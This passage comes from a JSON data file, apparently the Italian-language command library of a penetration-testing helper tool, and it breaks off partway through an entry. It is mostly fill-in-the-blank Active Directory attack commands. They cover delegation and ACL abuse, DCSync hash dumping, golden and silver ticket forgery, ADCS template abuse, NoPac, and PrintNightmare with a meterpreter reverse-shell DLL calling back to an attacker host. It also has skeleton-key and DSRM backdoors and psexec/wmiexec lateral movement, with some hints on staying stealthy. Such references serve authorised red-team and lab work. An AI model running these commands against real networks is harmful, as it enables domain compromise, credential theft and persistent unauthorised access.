      }
    ]
  },
  {
    "id": "rbcd-write",
    "name": "rbcd.py — scrivi AllowedToAct",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "Delegation (RBCD)",
    "description": "Scrive `msDS-AllowedToActOnBehalfOfOtherIdentity` sulla vittima: il tuo computer potrà impersonare chiunque verso di essa (poi `getST -impersonate`).",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "rbcd",
      "delegation"
    ],
    "template": "impacket-rbcd -delegate-to <target>$ -delegate-from <attacker>$ -action write <domain>/<user>:<password>",
    "params": [
      {
        "key": "target",
        "label": "Victim",
        "placeholder": "WS01"
      },
      {
        "key": "attacker",
        "label": "Owned",
        "placeholder": "ATK01"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ]
  },
  {
    "id": "shadow-creds",
    "name": "Shadow Credentials — certipy",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ACL Abuse",
    "description": "Con `GenericWrite`/`GenericAll` sul target (attributo `msDS-KeyCredentialLink`), aggiungi una tua chiave e ottieni il suo NT hash via PKINIT, senza resettargli la password. `shadow auto` fa tutto da solo: aggiunta, auth, NT hash e pulizia.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "shadow-credentials",
      "certipy",
      "keycredentiallink",
      "acl"
    ],
    "template": "certipy shadow auto -u <user>@<domain> -p '<password>' -account <target> -dc-ip <dc>",
    "params": [
      {
        "key": "user",
        "label": "User (con diritto)",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "target",
        "label": "Target account",
        "placeholder": "victim"
      },
      {
        "key": "dc",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.10"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "certipy (auto)",
        "template": "certipy shadow auto -u <user>@<domain> -p '<password>' -account <target> -dc-ip <dc>",
        "description": "Aggiunge la chiave, autentica e ritorna l'NT hash del target, poi pulisce."
      },
      {
        "id": "kerberos",
        "label": "Con Kerberos",
        "template": "certipy shadow auto -u <user>@<domain> -k -account <target> -dc-ip <dc>",
        "description": "Come sopra ma via Kerberos (`-k`, usa il ccache): utile se NTLM è disabilitato."
      }
    ],
    "note": "# pywhisker (passi separati)\nSe vuoi più controllo (add → TGT → NT hash → cleanup):\n- `pywhisker.py --dc-ip <dc> -d <domain> -u <user> -p '<password>' --target <target> --action add`\n- `gettgtpkinit.py -cert-pfx generated.pfx -pfx-pass '<pfxpass>' -dc-ip <dc> <domain>/<target> t.ccache`\n- `getnthash.py -key <as_rep_key> <domain>/<target>`\n- cleanup: `pywhisker.py ... --action remove --device-id <id>`",
    "refs": [
      {
        "label": "Certipy — GitHub",
        "url": "https://github.com/ly4k/Certipy"
      }
    ]
  },
  {
    "id": "laps-gmsa",
    "name": "LAPS / gMSA — read secrets",
    "category": "active-directory",
    "subcategory": "enumeration",
    "group": "LDAP",
    "description": "Se hai il diritto di lettura (ACL), leggi la password admin locale (LAPS) o la password gestita di un gMSA. Spesso è un salto diretto ad admin locale o a un account di servizio.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "laps",
      "gmsa",
      "nxc",
      "loot"
    ],
    "template": "nxc smb <dc> -u '<user>' -p '<password>' --laps",
    "params": [
      {
        "key": "dc",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.10"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "computer",
        "label": "Computer",
        "placeholder": "WS01"
      }
    ],
    "variants": [
      {
        "id": "laps",
        "label": "LAPS (nxc)",
        "template": "nxc smb <dc> -u '<user>' -p '<password>' --laps",
        "description": "Password admin locale via LAPS sui computer leggibili."
      },
      {
        "id": "gmsa",
        "label": "gMSA (nxc)",
        "template": "nxc ldap <dc> -u '<user>' -p '<password>' --gmsa",
        "description": "Password dei gMSA dove sei in `msDS-GroupMSAMembership` (richiede LDAPS)."
      },
      {
        "id": "bloodyad",
        "label": "LAPS (bloodyAD)",
        "template": "bloodyAD --host <dc> -d <domain> -u <user> -p '<password>' get object '<computer>$' --attr ms-Mcs-AdmPwd",
        "description": "Legge l'attributo LAPS (`ms-Mcs-AdmPwd`) di un computer specifico."
      }
    ]
  },
  {
    "id": "unconstrained-deleg",
    "name": "Unconstrained Delegation — coerce → TGT",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "Delegation (Unconstrained)",
    "description": "Con SYSTEM su una macchina con unconstrained delegation: monitori i TGT in arrivo, coerci il DC ad autenticarsi verso di te, catturi il suo TGT e fai DCSync. Enumera prima con `Get-DomainComputer -Unconstrained`.",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "unconstrained",
      "delegation",
      "rubeus",
      "coerce"
    ],
    "template": "# 1. sulla macchina con unconstrained: cattura i TGT\n.\\Rubeus.exe monitor /interval:5 /nowrap\n\n# 2. da Kali: forza il DC$\ncoercer coerce -u '<user>' -p '<password>' -d <domain> -l <lhost> -t <dc>\n\n# 3. inietta il TGT del DC$ catturato\n.\\Rubeus.exe ptt /ticket:<tgt_b64>\n\nmimikatz # lsadump::dcsync /user:<domain>\\Administrator",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "lhost",
        "label": "LHOST",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "dc",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.10"
      },
      {
        "key": "tgt_b64",
        "label": "TGT base64",
        "placeholder": "doIF..."
      }
    ]
  },
  {
    "id": "constrained-deleg",
    "name": "Constrained Delegation — abuso S4U",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "Delegation (Constrained)",
    "description": "Un account con `msDS-AllowedToDelegateTo` può impersonare qualsiasi utente verso i servizi elencati. Con le sue credenziali forgi un ticket come Administrator tramite S4U2Self+S4U2Proxy e accedi al servizio. Enumera con `Get-DomainUser -TrustedToAuth`.",
    "platform": "cross-platform",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "delegation",
      "constrained",
      "s4u"
    ],
    "template": "impacket-getST -spn '<spn>' -impersonate Administrator -dc-ip <ip> '<domain>/<user>:<password>'",
    "params": [
      {
        "key": "spn",
        "label": "SPN target",
        "placeholder": "cifs/fs.corp.local"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "Service account",
        "ctx": "user",
        "placeholder": "svc_web"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "host",
        "label": "Host target (FQDN)",
        "placeholder": "fs.corp.local"
      },
      {
        "key": "hash",
        "label": "NT hash",
        "ctx": "hash",
        "placeholder": "aad3b..."
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Linux (getST)",
        "template": "impacket-getST -spn '<spn>' -impersonate Administrator -dc-ip <ip> '<domain>/<user>:<password>'\n\nexport KRB5CCNAME='Administrator@<spn>@<domain>.ccache'\n\nimpacket-psexec -k -no-pass <host>",
        "description": "Forgi il ticket come Administrator verso lo SPN, lo carichi e accedi al servizio."
      },
      {
        "id": "rubeus",
        "label": "Windows (Rubeus)",
        "template": ".\\Rubeus.exe s4u /user:<user> /rc4:<hash> /impersonateuser:Administrator /msdsspn:'<spn>' /ptt",
        "description": "Stessa catena S4U da Windows, con inject diretto in memoria (`/ptt`). `/aes256` al posto di `/rc4` è più stealth."
      }
    ],
    "refs": [
      {
        "label": "The Hacker Recipes — Constrained delegation",
        "url": "https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained"
      }
    ]
  },
  {
    "id": "dcsync",
    "name": "DCSync — secretsdump -just-dc",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "DCSync",
    "description": "Con i diritti di replica (DA, o concessi via WriteDACL) estrai gli hash dal DC senza toccarlo. `-just-dc-ntlm` per i soli NTLM, `-just-dc-user` per un utente.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "dcsync"
    ],
    "tags": [
      "dcsync",
      "secretsdump",
      "impacket"
    ],
    "template": "secretsdump.py <domain>/<user>:<password>@<ip> -just-dc-ntlm",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Tutti NTLM",
        "template": "secretsdump.py <domain>/<user>:<password>@<ip> -just-dc-ntlm",
        "description": "Hash NTLM di tutto il dominio."
      },
      {
        "id": "krbtgt",
        "label": "Solo krbtgt",
        "template": "secretsdump.py <domain>/<user>:<password>@<ip> -just-dc-user krbtgt",
        "description": "Hash del `krbtgt` (per il Golden Ticket)."
      }
    ]
  },
  {
    "id": "golden-ticket",
    "name": "Golden Ticket — krbtgt",
    "category": "active-directory",
    "subcategory": "persistence",
    "group": "Ticket Forgery",
    "description": "Con l’hash del `krbtgt` e il SID di dominio forgi un TGT per qualsiasi utente: accesso persistente finché il `krbtgt` non viene cambiato 2 volte.",
    "platform": "cross-platform",
    "requires": [
      "hash"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "golden-ticket",
      "krbtgt",
      "persistence"
    ],
    "template": "ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain <domain> Administrator",
    "params": [
      {
        "key": "krbtgt",
        "label": "krbtgt hash",
        "placeholder": "<nt-hash>"
      },
      {
        "key": "sid",
        "label": "Domain SID",
        "placeholder": "S-1-5-21-..."
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Linux (ticketer)",
        "template": "ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain <domain> Administrator",
        "description": "Crea `Administrator.ccache`; poi `export KRB5CCNAME=Administrator.ccache`."
      },
      {
        "id": "mimikatz",
        "label": "Windows (mimikatz)",
        "template": ".\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /krbtgt:<krbtgt> /ptt\" \"exit\"",
        "description": "Forgia e inietta (`/ptt`) il ticket in memoria."
      }
    ]
  },
  {
    "id": "getst-s4u",
    "name": "getST.py — S4U2Self / S4U2Proxy",
    "category": "active-directory",
    "subcategory": "persistence",
    "group": "Ticket Forgery",
    "description": "Forgia un service ticket come un altro utente (catena S4U2Self+S4U2Proxy) verso un SPN del target: passo finale di RBCD/Constrained Delegation.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "impacket",
      "s4u"
    ],
    "template": "getST.py -spn 'cifs/<target>' -impersonate '<impersonate>' '<domain>/<user>:<password>'",
    "params": [
      {
        "key": "target",
        "label": "Target FQDN",
        "placeholder": "ws01.corp.local"
      },
      {
        "key": "impersonate",
        "label": "Impersonate",
        "placeholder": "administrator"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "Attacker",
        "ctx": "user",
        "placeholder": "ATK01$"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ]
  },
  {
    "id": "powerview",
    "name": "PowerView — enum AD (Windows)",
    "category": "active-directory",
    "subcategory": "enumeration",
    "group": "PowerView",
    "description": "Enumerazione AD da Windows in memoria. Trova candidati Kerberoast (`-SPN`), ASREPRoast (`-PreauthNotRequired`), ACL sfruttabili e dove sei admin locale.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "powerview",
      "enum",
      "ad"
    ],
    "template": "Get-Domain; Get-DomainController; Get-DomainPolicy",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Dominio",
        "template": "Get-Domain; Get-DomainController; Get-DomainPolicy",
        "description": "Info dominio, DC e policy (lockout, password age)."
      },
      {
        "id": "spn",
        "label": "Kerberoast (SPN)",
        "template": "Get-DomainUser -SPN | select samaccountname,serviceprincipalname",
        "description": "Utenti con SPN → candidati Kerberoasting."
      },
      {
        "id": "preauth",
        "label": "ASREP",
        "template": "Get-DomainUser -PreauthNotRequired | select samaccountname",
        "description": "Utenti senza pre-auth → candidati ASREPRoasting."
      },
      {
        "id": "acl",
        "label": "ACL",
        "template": "Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -eq '<user>'}",
        "description": "ACL interessanti per l’utente compromesso (ForceChangePassword, GenericWrite…)."
      },
      {
        "id": "admin",
        "label": "Local admin",
        "template": "Find-LocalAdminAccess",
        "description": "Macchine dove l’utente corrente è admin locale (🚩 rumoroso)."
      }
    ]
  },
  {
    "id": "certipy-esc",
    "name": "Certipy — ESC4 / ESC7",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ADCS — ESC4/7",
    "description": "Altri abusi ADCS oltre `ESC1`. `ESC4`: hai diritti di scrittura sul template → lo riscrivi come `ESC1` (poi RIPRISTINA!). `ESC7`: hai Manage CA → ti aggiungi Officer e abiliti il template `SubCA`.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "rpc"
    ],
    "tags": [
      "certipy",
      "adcs",
      "esc4",
      "esc7"
    ],
    "template": "certipy template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template> -save-old",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "ca",
        "label": "CA",
        "placeholder": "CORP-CA"
      },
      {
        "key": "template",
        "label": "Template",
        "placeholder": "VulnTemplate"
      },
      {
        "key": "id",
        "label": "Request ID",
        "placeholder": "12"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "ESC4 (write template)",
        "template": "certipy template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template> -save-old\ncertipy template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template>\ncertipy req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn Administrator@<domain>\n# RIPRISTINA il template originale\ncertipy template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template> -configuration <template>.json",
        "description": "Salvi la config, riscrivi il template come ESC1, richiedi il cert come Administrator, poi ripristini l'originale."
      },
      {
        "id": "esc7",
        "label": "ESC7 (Manage CA)",
        "template": "certipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -add-officer <user>\ncertipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -enable-template SubCA\ncertipy req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template SubCA -upn Administrator@<domain>\ncertipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -issue-request <id>\ncertipy req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -retrieve <id>",
        "description": "Ti aggiungi Officer, abiliti SubCA, richiedi (va in pending), la emetti come Officer e recuperi il cert."
      }
    ]
  },
  {
    "id": "gpo-abuse",
    "name": "SharpGPOAbuse — abusa GPO",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "GPO Abuse",
    "description": "Se hai diritti di scrittura su una GPO, aggiungiti come admin locale su tutte le macchine nel suo scope, o piazza uno scheduled task come SYSTEM. Poi `gpupdate /force`.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "sharpgpoabuse",
      "gpo"
    ],
    "template": ".\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName \"<gpo>\"",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "gpo",
        "label": "GPO",
        "placeholder": "Default Domain Policy"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Add local admin",
        "template": ".\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName \"<gpo>\"",
        "description": "Aggiunge l’utente agli admin locali nello scope della GPO."
      },
      {
        "id": "task",
        "label": "Scheduled task",
        "template": ".\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author <user> --Command \"cmd.exe\" --Arguments \"/c <cmd>\" --GPOName \"<gpo>\"",
        "description": "Esegue un comando come SYSTEM sulle macchine nello scope."
      }
    ]
  },
  {
    "id": "nopac",
    "name": "NoPac (CVE-2021-42278/42287)",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "CVE",
    "description": "Con un qualsiasi account di dominio (e `MAQ > 0`) ottieni SYSTEM sul DC sfruttando l’incoerenza sAMAccountName. `-shell` per una shell, `-dump` per DCSync diretto.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "nopac",
      "cve-2021-42278",
      "sambacry"
    ],
    "template": "sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <ip> -dc-host <dchost> -shell --impersonate administrator -use-ldap",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "dchost",
        "label": "DC hostname",
        "placeholder": "DC01"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Shell",
        "template": "sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <ip> -dc-host <dchost> -shell --impersonate administrator -use-ldap",
        "description": "Shell SYSTEM sul DC."
      },
      {
        "id": "dump",
        "label": "DCSync",
        "template": "sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <ip> -dc-host <dchost> --impersonate administrator -use-ldap -dump",
        "description": "Dump diretto degli hash, senza shell."
      },
      {
        "id": "scan",
        "label": "Scan",
        "template": "sudo python3 scanner.py <domain>/<user>:<password> -dc-ip <ip> -use-ldap",
        "description": "Verifica se il DC è vulnerabile."
      }
    ]
  },
  {
    "id": "printnightmare",
    "name": "PrintNightmare — CVE-2021-1675 / 34527",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "CVE",
    "description": "Se il Print Spooler del DC è attivo, carichi una DLL malevola via MS-RPRN e ottieni esecuzione come SYSTEM sul DC. Verifica prima che il servizio risponda, poi ospita la DLL su una share SMB.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "rpc",
      "smb"
    ],
    "tags": [
      "printnightmare",
      "cve-2021-1675",
      "rce"
    ],
    "template": "python3 CVE-2021-1675.py <domain>/<user>:'<password>'@<ip> '\\\\<lhost>\\share\\payload.dll'",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "lhost",
        "label": "LHOST (SMB)",
        "placeholder": "10.10.14.5"
      }
    ],
    "variants": [
      {
        "id": "scan",
        "label": "Verifica vulnerabilità",
        "template": "rpcdump.py @<ip> | egrep 'MS-RPRN|MS-PAR'",
        "description": "Controlla che il Print Spooler (MS-RPRN) sia esposto sul DC."
      },
      {
        "id": "default",
        "label": "Exploit (cube0x0)",
        "template": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=8080 -f dll -o payload.dll\nsudo smbserver.py -smb2support share ./\npython3 CVE-2021-1675.py <domain>/<user>:'<password>'@<ip> '\\\\<lhost>\\share\\payload.dll'",
        "description": "Generi la DLL, la ospiti via SMB e la esegui come SYSTEM sul DC."
      }
    ],
    "refs": [
      {
        "label": "cube0x0 — CVE-2021-1675",
        "url": "https://github.com/cube0x0/CVE-2021-1675"
      }
    ]
  },
  {
    "id": "writedacl-dcsync",
    "name": "WriteDACL → DCSync",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ACL Abuse",
    "description": "Con `WriteDACL` sul dominio concediti i diritti di replica (DCSync) col tuo account, poi estrai gli hash. Ricorda di rimuovere il diritto dopo (cleanup).",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "dcsync"
    ],
    "tags": [
      "bloodyad",
      "writedacl",
      "dcsync"
    ],
    "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add dcsync <user>\nsecretsdump.py <domain>/<user>:'<password>'@<ip> -just-dc-ntlm\n\n# cleanup: rimuovi il diritto di replica\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' remove dcsync <user>",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ]
  },
  {
    "id": "trust-extrasid",
    "name": "Trust child→parent (ExtraSID)",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "Domain Trust",
    "description": "Compromesso un child domain, sali al parent: Golden Ticket del child con il SID degli Enterprise Admins del parent (`<parentsid>-519`) iniettato come ExtraSID. Serve il krbtgt del child.",
    "platform": "cross-platform",
    "requires": [
      "hash"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "trust",
      "extrasid",
      "sid-history"
    ],
    "template": "ticketer.py -nthash <krbtgt> -domain <childdomain> -domain-sid <childsid> -extra-sid <parentsid>-519 hacker",
    "params": [
      {
        "key": "krbtgt",
        "label": "krbtgt child",
        "placeholder": "<nt-hash>"
      },
      {
        "key": "childdomain",
        "label": "Child domain",
        "placeholder": "sub.corp.local"
      },
      {
        "key": "childsid",
        "label": "Child SID",
        "placeholder": "S-1-5-21-..."
      },
      {
        "key": "parentsid",
        "label": "Parent SID",
        "placeholder": "S-1-5-21-..."
      },
      {
        "key": "parentdc",
        "label": "Parent DC (FQDN)",
        "placeholder": "dc.corp.local"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Manuale (ticketer)",
        "template": "ticketer.py -nthash <krbtgt> -domain <childdomain> -domain-sid <childsid> -extra-sid <parentsid>-519 hacker\nexport KRB5CCNAME=hacker.ccache\npsexec.py <childdomain>/hacker@<parentdc> -k -no-pass",
        "description": "Crei il ticket con l'ExtraSID, lo carichi e accedi al parent DC."
      },
      {
        "id": "shortcut",
        "label": "Automatico (raiseChild)",
        "template": "raiseChild.py -target-exec <parentdcip> <childdomain>/<user>:<password>",
        "description": "Fa tutto in un comando (dump `krbtgt`, SID, ticket, exec)."
      }
    ]
  },
  {
    "id": "silver-ticket",
    "name": "Silver Ticket — servizio",
    "category": "active-directory",
    "subcategory": "persistence",
    "group": "Ticket Forgery",
    "description": "Ticket forgiato per UN singolo servizio: non serve il `krbtgt`, basta l’hash dell’account di servizio/computer. Più silenzioso del Golden (non passa dal DC).",
    "platform": "cross-platform",
    "requires": [
      "hash"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "silver-ticket",
      "kerberos"
    ],
    "template": "ticketer.py -nthash <servicehash> -domain-sid <sid> -domain <domain> -spn <spn> Administrator",
    "params": [
      {
        "key": "servicehash",
        "label": "Hash servizio",
        "placeholder": "<nt-hash>"
      },
      {
        "key": "sid",
        "label": "Domain SID",
        "placeholder": "S-1-5-21-..."
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "spn",
        "label": "SPN",
        "placeholder": "cifs/ws01.corp.local"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Linux (ticketer)",
        "template": "ticketer.py -nthash <servicehash> -domain-sid <sid> -domain <domain> -spn <spn> Administrator",
        "description": "Crea il ticket per lo SPN indicato."
      },
      {
        "id": "mimikatz",
        "label": "Windows (mimikatz)",
        "template": ".\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /rc4:<servicehash> /target:<target> /service:cifs /ptt\" \"exit\"",
        "description": "Forgia e inietta il silver ticket per `cifs` sul target."
      }
    ]
  },
  {
    "id": "skeleton-key",
    "name": "Skeleton Key (mimikatz)",
    "category": "active-directory",
    "subcategory": "persistence",
    "group": "Backdoor",
    "description": "Inietta una skeleton key nel LSASS del DC: ogni account si autentica anche con la password `mimikatz`. Non persiste al riavvio, serve DA sul DC. 🚩",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "mimikatz",
      "skeleton-key"
    ],
    "template": ".\\mimikatz.exe \"privilege::debug\" \"misc::skeleton\" \"exit\"",
    "params": []
  },
  {
    "id": "dsrm",
    "name": "DSRM admin",
    "category": "active-directory",
    "subcategory": "persistence",
    "group": "Backdoor",
    "description": "La password DSRM è l’admin locale del DC: abilita il logon via rete nel registro, poi fai Pass-the-Hash con l’hash DSRM. Persiste al riavvio.",
    "platform": "windows",
    "requires": [
      "hash"
    ],
    "protocols": [],
    "tags": [
      "dsrm",
      "persistence"
    ],
    "template": "New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD\n.\\mimikatz.exe \"sekurlsa::pth /domain:<dchost> /user:Administrator /ntlm:<dsrmhash> /run:powershell.exe\" \"exit\"",
    "params": [
      {
        "key": "dchost",
        "label": "DC hostname",
        "placeholder": "DC01"
      },
      {
        "key": "dsrmhash",
        "label": "DSRM hash",
        "placeholder": "<nt-hash>"
      }
    ]
  },
  {
    "id": "psexec",
    "name": "psexec.py — shell SYSTEM",
    "category": "lateral",
    "subcategory": "remote-shells",
    "group": "Impacket Shells",
    "description": "Crea un servizio su `ADMIN$` ed esegue come SYSTEM. Affidabile ma rumoroso (scrive su disco e crea un servizio). Serve admin locale sul target.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "impacket",
      "psexec"
    ],
    "template": "psexec.py <domain>/<user>:<password>@<ip>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Password",
        "template": "psexec.py <domain>/<user>:<password>@<ip>",
        "description": "Auth con password."
      },
      {
        "id": "hash",
        "label": "Pass-the-Hash",
        "template": "psexec.py <domain>/<user>@<ip> -hashes :<hash>",
        "description": "Pass-the-Hash con NTLM (solo la parte NT, dopo i due punti)."
      }
    ]
  },
  {
    "id": "wmiexec",
    "name": "wmiexec.py — semi-interattiva",
    "category": "lateral",
    "subcategory": "remote-shells",
    "group": "Impacket Shells",
    "description": "Esegue via DCOM/WMI senza installare servizi né scrivere su disco: più silenzioso di psexec.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "rpc",
      "wmi"
    ],
    "tags": [
      "impacket",
      "wmiexec"
    ],
    "template": "wmiexec.py <domain>/<user>:<password>@<ip>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
